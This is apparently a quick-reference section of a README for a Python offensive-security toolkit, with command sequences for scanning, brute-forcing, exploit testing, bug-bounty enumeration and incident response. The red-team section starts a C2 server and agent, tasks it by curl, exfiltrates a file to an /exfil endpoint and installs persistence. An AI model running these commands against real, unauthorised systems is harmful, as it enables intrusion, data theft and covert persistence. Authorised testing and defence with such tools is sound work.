## Use Case Quick Reference

### Use Case 1: Quick Security Assessment

```bash
# 1. Scan target
python3 port_scanner.py 192.168.1.1 -p 1-1000 -t 100

# 2. Check web services
python3 brute_forcer.py http://192.168.1.1 -w common -t 30

# 3. Test for vulnerabilities
python3 exploit_framework.py "http://192.168.1.1/page.php?id=1" --all --parameter id

# 4. Generate report
# Results are automatically saved to JSON files
```

### Use Case 2: Red Team Setup

```bash
# 1. Start C2
python3 c2_server.py &

# 2. Deploy agent
python3 c2_agent.py

# 3. Add tasks
curl -X POST http://localhost:8443/c2/task \
  -H "Content-Type: application/json" \
  -d '{"agent_id":"ID","command":"whoami"}'

# 4. Exfiltrate data
python3 exfiltration.py --http -u http://localhost:8080/exfil -f data.txt

# 5. Install persistence
python3 persistence.py --install agent.exe --all
```

### Use Case 3: Bug Bounty Automation

```bash
# 1. Enumerate subdomains
python3 subdomain_enum.py example.com -t 50 > subdomains.txt

# 2. Scan each subdomain
for domain in $(cat subdomains.txt); do
    python3 port_scanner.py $domain -p 80,443 -t 20
    python3 brute_forcer.py http://$domain -w common -t 30
done

# 3. Analyze findings
python3 -c "from html_analyzer import HTMLAnalyzer; ..."
```

### Use Case 4: Incident Response

```bash
# 1. Enumerate compromised system
python3 enumerator.py --all -o compromised.json

# 2. Check for persistence
python3 persistence.py --cleanup --dry-run

# 3. Capture evidence
sudo tcpdump -i any -c 1000 -w evidence.pcap

# 4. Generate report
python3 persistence.py --report --format json -o ir_report.json
```

